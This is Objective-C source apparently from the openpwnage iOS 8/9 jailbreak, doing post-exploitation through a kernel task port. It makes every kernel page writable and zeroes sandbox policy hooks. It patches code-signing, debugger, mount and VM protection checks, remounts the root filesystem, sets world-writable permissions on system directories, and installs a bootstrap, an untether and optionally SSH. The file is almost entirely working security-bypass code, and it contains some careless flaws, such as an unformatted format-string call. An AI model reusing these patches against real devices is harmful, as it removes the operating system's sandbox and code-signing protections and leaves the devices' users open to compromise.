// jailbreak.m from openpwnage

#import <Foundation/Foundation.h>
#include <mach/mach.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/utsname.h>
#include <UIKit/UIKit.h>
#include <sys/mount.h>
#include <spawn.h>
#include <sys/sysctl.h>
#include <sys/stat.h>
#include <copyfile.h>

#include "jailbreak.h"
#include "mac_policy_ops.h"
#include "patchfinder8.h"

#import "ViewController.h"

uint32_t pmaps[TTB_SIZE];
int pmapscnt = 0;

bool isA5orA5X(void) {
    //NSLog(@"%@", nkernv);
    if([nkernv containsString:@"S5L894"]) {
        printf("A5(X) device\n");
        return true;
    }
    printf("A6(X) device\n");
    return false;
}

uint32_t kread_uint32(uint32_t addr, task_t tfp0) {
    vm_size_t bytesRead=0;
    uint32_t ret = 0;
    vm_read_overwrite(tfp0,addr,4,(vm_address_t)&ret,&bytesRead);
    return ret;
}

void kwrite_uint32(uint32_t addr, uint32_t value, task_t tfp0) {
    vm_write(tfp0,addr,(vm_offset_t)&value,4);
}

void kwrite_uint8(uint32_t addr, uint8_t value, task_t tfp0) {
    vm_write(tfp0,addr,(vm_offset_t)&value,1);
}

uint32_t find_kernel_pmap(uintptr_t kernel_base) {
    uint32_t pmap_addr;
    if(isA5orA5X()) {
        //A5 or A5X
        if ([nkernv containsString:@"3248"]) { //9.0-9.0.2
            printf("9.0-9.0.2\n");
            pmap_addr = 0x3f7444;
        } else if ([nkernv containsString:@"2784"]) { //8.3-8.4.1
            printf("8.3-8.4.1\n");
            pmap_addr = 0x3a211c;
        } else if ([nkernv containsString:@"2783.5"]) { //8.2
            printf("8.2\n");
            pmap_addr = 0x39411c;
        } else if ([nkernv containsString:@"2783.3.26"]) { //8.1.3
            printf("8.1.3\n");
            pmap_addr = 0x39211c;
        } else { //8.0-8.1.2
            printf("8.0-8.1.2\n");
            pmap_addr = 0x39111c;
        }
    } else {
        //A6 or A6X
        if ([nkernv containsString:@"3248"]) { //9.0-9.0.2
            printf("9.0-9.0.2\n");
            pmap_addr = 0x3fd444;
        } else if ([nkernv containsString:@"2784"]) { //8.3-8.4.1
            printf("8.3-8.4.1\n");
            pmap_addr = 0x3a711c;
        } else if ([nkernv containsString:@"2783.5"]) { //8.2
            printf("8.2\n");
            pmap_addr = 0x39a11c;
        } else { //8.0-8.1.3
            printf("8.0-8.1.3\n");
            pmap_addr = 0x39711c;
        }
    }
    printf("using offset 0x%08x for pmap\n",pmap_addr);
    return pmap_addr + kernel_base;
}

void patch_kernel_pmap(task_t tfp0, uintptr_t kernel_base) {
    uint32_t kernel_pmap         = find_kernel_pmap(kernel_base);
    uint32_t kernel_pmap_store   = kread_uint32(kernel_pmap,tfp0);
    uint32_t tte_virt            = kread_uint32(kernel_pmap_store,tfp0);
    uint32_t tte_phys            = kread_uint32(kernel_pmap_store+4,tfp0);

    printf("kernel pmap store @ 0x%08x\n",
            kernel_pmap_store);
    printf("kernel pmap tte is at VA 0x%08x PA 0x%08x\n",
            tte_virt,
            tte_phys);

    /*
     *  every page is writable
     */
    uint32_t i;
    for (i = 0; i < TTB_SIZE; i++) {
        uint32_t addr   = tte_virt + (i << 2);
        uint32_t entry  = kread_uint32(addr,tfp0);
        if (entry == 0) continue;
        if ((entry & 0x3) == 1) {
            /*
             *  if the 2 lsb are 1 that means there is a second level
             *  pagetable that we need to give readwrite access to.
             *  zero bytes 0-10 to get the pagetable address
             */
            uint32_t second_level_page_addr = (entry & (~0x3ff)) - tte_phys + tte_virt;
            for (int i = 0; i < 256; i++) {
                /*
                 *  second level pagetable has 256 entries, we need to patch all
                 *  of them
                 */
                uint32_t sladdr  = second_level_page_addr+(i<<2);
                uint32_t slentry = kread_uint32(sladdr,tfp0);

                if (slentry == 0)
                    continue;

                /*
                 *  set the 9th bit to zero
                 */
                uint32_t new_entry = slentry & (~0x200);
                if (slentry != new_entry) {
                    kwrite_uint32(sladdr, new_entry,tfp0);
                    pmaps[pmapscnt++] = sladdr;
                }
            }
            continue;
        }

        if ((entry & L1_SECT_PROTO) == 2) {
            uint32_t new_entry  =  L1_PROTO_TTE(entry);
            new_entry           &= ~L1_SECT_APX;
            kwrite_uint32(addr, new_entry,tfp0);
        }
    }

    printf("every page is actually writable\n");
    usleep(100000);
}

bool is_pmap_patch_success(task_t tfp0, uintptr_t kernel_base) {
    patch_kernel_pmap(tfp0, kernel_base);

    uint32_t before = -1;
    uint32_t after = -1;

    printf("check pmap patch\n");

    before = kread_uint32(kernel_base, tfp0);
    kwrite_uint32(kernel_base, 0x41414141, tfp0);
    after = kread_uint32(kernel_base, tfp0);
    kwrite_uint32(kernel_base, before, tfp0);

    if ((before != after) && (after == 0x41414141)) {
        printf("pmap patched!\n");
    } else {
        printf("pmap patch failed\n");
        return false;
    }
    return true;
}

void run_cmd(char *cmd, ...) {
    pid_t pid;
    va_list ap;
    char* cmd_ = NULL;

    va_start(ap, cmd);
    vasprintf(&cmd_, cmd, ap);

    char *argv[] = {"sh", "-c", cmd_, NULL};

    int status;
    printf("Run command: %s\n", cmd_);
    status = posix_spawn(&pid, "/bin/sh", NULL, NULL, argv, NULL);
    if (status == 0) {
        printf("Child pid: %i\n", pid);
        do {
            if (waitpid(pid, &status, 0) != -1) {
                printf("Child status %d\n", WEXITSTATUS(status));
            } else {
                perror("waitpid");
            }
        } while (!WIFEXITED(status) && !WIFSIGNALED(status));
    } else {
        printf("posix_spawn: %s\n", strerror(status));
    }
}

void run_tar(char *cmd, ...) {
    pid_t pid;
    va_list ap;
    char* cmd_ = NULL;

    va_start(ap, cmd);
    vasprintf(&cmd_, cmd, ap);

    char *argv[] = {"/bin/tar", "-xf", cmd_, "-C", "/", "--preserve-permissions", NULL};

    int status;
    printf("Run command: %s\n", cmd_);
    status = posix_spawn(&pid, "/bin/tar", NULL, NULL, argv, NULL);
    if (status == 0) {
        printf("Child pid: %i\n", pid);
        do {
            if (waitpid(pid, &status, 0) != -1) {
                printf("Child status %d\n", WEXITSTATUS(status));
            } else {
                perror("waitpid");
            }
        } while (!WIFEXITED(status) && !WIFSIGNALED(status));
    } else {
        printf("posix_spawn: %s\n", strerror(status));
        exit(1);
    }
}

void dump_kernel_8(mach_port_t tfp0, vm_address_t kernel_base, uint8_t *dest, size_t ksize) {
    for (vm_address_t addr = kernel_base, e = 0; addr < kernel_base + ksize; addr += CHUNK_SIZE, e += CHUNK_SIZE) {
        pointer_t buf = 0;
        vm_address_t sz = 0;
        vm_read(tfp0, addr, CHUNK_SIZE, &buf, &sz);
        if (buf == 0 || sz == 0)
            continue;
        bcopy((uint8_t *)buf, dest + e, CHUNK_SIZE);
    }
}

int patch_kernel(mach_port_t tfp0, uint32_t kernel_base) {
    printf("unsandboxing...\n");
    
    uint8_t* kdata = NULL;
    size_t ksize = 0xFFE000;
    kdata = malloc(ksize);
    dump_kernel_8(tfp0, kernel_base, kdata, ksize);
    if (!kdata) {
        printf("fuck\n");
        exit(1);
    }
    printf("now...\n");
    
    uint32_t sbopsoffset = find_sbops(kernel_base, kdata, ksize);

    printf("nuking sandbox at 0x%08lx\n", kernel_base + sbopsoffset);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_ioctl), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_access), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_create), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_chroot), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exchangedata), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_deleteextattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_notify_create), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_listextattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_open), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setattrlist), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_link), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_exec), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_stat), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_unlink), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattrlist), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getextattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_rename), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_file_check_mmap), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_cred_label_update_execve), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_mount_check_stat), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_proc_check_fork), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_readlink), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setextattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setflags), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_fsgetpath), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setmode), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setowner), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_setutimes), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_truncate), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_vnode_check_getattr), 0,tfp0);
    kwrite_uint32(kernel_base + sbopsoffset + offsetof(struct mac_policy_ops, mpo_iokit_check_get_property), 0,tfp0);
    printf("nuked sandbox\n");
    printf("let's go for code exec...\n");
    
    uint32_t tfp0_patch = find_tfp0_patch(kernel_base, kdata, ksize);
    uint32_t mapForIO = find_mapForIO(kernel_base, kdata, ksize);
    uint32_t sandbox_call_i_can_has_debugger = find_sandbox_call_i_can_has_debugger8(kernel_base, kdata, ksize);
    uint32_t proc_enforce8 = find_proc_enforce8(kernel_base, kdata, ksize);
    //uint32_t vm_fault_enter = find_vm_fault_enter_patch_84(kernel_base, kdata, ksize);
    uint32_t vm_map_enter8 = find_vm_map_enter_patch8(kernel_base, kdata, ksize);
    uint32_t vm_map_protect8 = find_vm_map_protect_patch8(kernel_base, kdata, ksize);
    uint32_t csops8 = find_csops8(kernel_base, kdata, ksize);
    uint32_t cs_enforcement_disable_amfi = find_cs_enforcement_disable_amfi8(kernel_base, kdata, ksize);

    uint32_t mount_common;
    uint32_t PE_i_can_has_debugger_1;
    uint32_t PE_i_can_has_debugger_2;

    if ([nkernv containsString:@"3248"]) {
        mount_common = find_mount_90(kernel_base, kdata, ksize);
        PE_i_can_has_debugger_1 = find_i_can_has_debugger_1_90(kernel_base, kdata, ksize);
        PE_i_can_has_debugger_2 = find_i_can_has_debugger_2_90(kernel_base, kdata, ksize);

        uint32_t amfi_file_check_mmap = find_amfi_file_check_mmap(kernel_base, kdata, ksize);

        printf("patching mount_common at 0x%08x\n", kernel_base + mount_common);
        kwrite_uint8(kernel_base + mount_common + 1, 0xe7, tfp0);
        
        printf("patching cs_enforcement_disable_amfi - 1\n");
        kwrite_uint8(kernel_base + cs_enforcement_disable_amfi - 1, 1, tfp0);

        printf("patching amfi_file_check_mmap at 0x%08x\n", kernel_base + amfi_file_check_mmap);
        kwrite_uint32(kernel_base + amfi_file_check_mmap, 0xbf00bf00, tfp0);

    } else {
        mount_common = find_mount8(kernel_base, kdata, ksize);
        PE_i_can_has_debugger_1 = find_i_can_has_debugger_1(kernel_base, kdata, ksize);
        PE_i_can_has_debugger_2 = find_i_can_has_debugger_2(kernel_base, kdata, ksize);

        uint32_t csops2 = find_csops2(kernel_base, kdata, ksize);

        printf("patching mount_common at 0x%08x\n", kernel_base + mount_common);
        kwrite_uint8(kernel_base + mount_common + 1, 0xe0, tfp0);
        
        printf("patching cs_enforcement_disable_amfi - 4\n");
        kwrite_uint8(kernel_base + cs_enforcement_disable_amfi - 4, 1, tfp0);

        printf("patching csops2 at 0x%08x\n", kernel_base + csops2);
        kwrite_uint8(kernel_base + csops2, 0x20, tfp0);
    }

    printf("patching tfp0 at 0x%08x\n", kernel_base + tfp0_patch);
    kwrite_uint32(kernel_base + tfp0_patch, 0xbf00bf00, tfp0);

    printf("patching mapForIO at 0x%08x\n", kernel_base + mapForIO);
    kwrite_uint32(kernel_base + mapForIO, 0xbf00bf00,tfp0);

    printf("patching cs_enforcement_disable_amfi at 0x%08x\n", kernel_base + cs_enforcement_disable_amfi - 1);
    kwrite_uint8(kernel_base + cs_enforcement_disable_amfi, 1, tfp0);
    
    printf("patching PE_i_can_has_debugger_1 at 0x%08x\n", kernel_base + PE_i_can_has_debugger_1);
    kwrite_uint32(kernel_base + PE_i_can_has_debugger_1, 1, tfp0);
    
    printf("patching PE_i_can_has_debugger_2 at 0x%08x\n", kernel_base + PE_i_can_has_debugger_2);
    kwrite_uint32(kernel_base + PE_i_can_has_debugger_2, 1, tfp0);
    
    printf("patching sandbox_call_i_can_has_debugger at 0x%08x\n", kernel_base + sandbox_call_i_can_has_debugger);
    kwrite_uint32(kernel_base + sandbox_call_i_can_has_debugger, 0xbf00bf00, tfp0);

    printf("patching proc_enforce at 0x%08x\n", kernel_base + proc_enforce8);
    kwrite_uint8(kernel_base + proc_enforce8, 0, tfp0);

    //printf("patching vm_fault_enter at 0x%08x\n", kernel_base + vm_fault_enter);
    //kwrite_uint32(kernel_base + vm_fault_enter, 0x2201bf00, tfp0);

    printf("patching vm_map_enter at 0x%08x\n", kernel_base + vm_map_enter8);
    kwrite_uint32(kernel_base + vm_map_enter8, 0x4280bf00, tfp0);

    printf("patching vm_map_protect at 0x%08x\n", kernel_base + vm_map_protect8);
    kwrite_uint32(kernel_base + vm_map_protect8, 0xbf00bf00, tfp0);

    printf("patching csops at 0x%08x\n", kernel_base + csops8);
    kwrite_uint32(kernel_base + csops8, 0xbf00bf00, tfp0);

    return 0;
}

char *getFilePath(const char *fileName) {
    NSString *filePathObj = [[[NSBundle mainBundle] resourcePath] stringByAppendingPathComponent:[NSString stringWithUTF8String:fileName]];
    return [filePathObj UTF8String];
}

int postjailbreak(bool untether_on) {
    printf("[*] remounting rootfs\n");
    char* nmr = strdup("/dev/disk0s1s1");
    int mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
    printf("remount = %d\n",mntr);
    while (mntr != 0) {
        mntr = mount("hfs", "/", MNT_UPDATE, &nmr);
        printf("remount = %d\n",mntr);
        usleep(100000);
    }
    sync();

    bool InstallBootstrap = false;
    if (!((access("/.installed-openpwnage", F_OK) != -1) || (access("/.installed_everpwnage", F_OK) != -1) ||
          (access("/.installed_home_depot", F_OK) != -1) || (access("/untether/untether", F_OK) != -1) ||
          (access("/.installed_daibutsu", F_OK) != -1)) || reinstall_strap) {
        printf("installing bootstrap...\n");

        printf("copying tar\n");
        copyfile(getFilePath("tar"), "/bin/tar", NULL, COPYFILE_ALL);

        chmod("/bin/tar", 0755);
        printf("chmod'd tar_path\n");

        printf("extracting bootstrap\n");
        run_tar("%s", getFilePath("bootstrap.tar"));

        printf("disabling stashing\n");
        run_cmd("/bin/touch /.cydia_no_stash");

        printf("copying launchctl\n");
        run_cmd("/bin/cp -p %s /bin/launchctl", getFilePath("launchctl"));

        printf("fixing perms...\n");
        chmod("/bin/tar", 0755);
        chmod("/bin/launchctl", 0755);
        chmod("/private", 0777);
        chmod("/private/var", 0777);
        chmod("/private/var/mobile", 0777);
        chmod("/private/var/mobile/Library", 0777);
        chmod("/private/var/mobile/Library/Preferences", 0777);
        mkdir("/Library/LaunchDaemons", 0755);
        FILE* fp = fopen("/private/etc/apt/sources.list.d/LukeZGD.list", "w");
        fprintf(fp, "deb https://lukezgd.github.io/repo ./\n");
        fclose(fp);
        fp = fopen("/.installed_everpwnage", "w");
        fprintf(fp, "do **NOT** delete this file, it's important. it's how we detect if the bootstrap was installed.\n");
        fclose(fp);

        sync();

        printf("bootstrap installed\n");
        InstallBootstrap = true;
    } else {
        printf("bootstrap already installed\n");
    }

    printf("allowing jailbreak apps to be shown\n");
    NSMutableDictionary *md = [[NSMutableDictionary alloc] initWithContentsOfFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist"];
    [md setObject:[NSNumber numberWithBool:YES] forKey:@"SBShowNonDefaultSystemApps"];
    [md writeToFile:@"/var/mobile/Library/Preferences/com.apple.springboard.plist" atomically:YES];

    printf("restarting cfprefs\n");
    run_cmd("/usr/bin/killall -9 cfprefsd &");

    if (install_openssh) {
        printf("extracting openssh\n");
        run_tar("%s", getFilePath("openssh.tar"));
    }

    printf("loading launch daemons\n");
    run_cmd("/bin/launchctl load /Library/LaunchDaemons/*");
    run_cmd("/etc/rc.d/*");

    if (InstallBootstrap) {
        printf("running uicache\n");
        run_cmd("su -c uicache mobile");
    }

    if (untether_on) {
        if ([nkernv containsString:@"3248"] || (isA5orA5X() && [nkernv containsString:@"2783"])) {
            // all 9.0.x and a5(x) 8.0-8.2
            printf("extracting everuntether\n");
            run_tar(getFilePath("everuntether.tar"));
        } else {
            // a6(x) 8.x and a5(x) 8.3-8.4.1
            printf("extracting daibutsu untether\n");
            run_tar("%s", getFilePath("untether.tar"));
        }
        printf("running postinst\n");
        run_cmd("/bin/bash /private/var/tmp/postinst configure");
        printf("done.");
        return 0;
    }

    printf("respringing\n");
    run_cmd("(killall -9 backboardd) &");

    return 0;
}
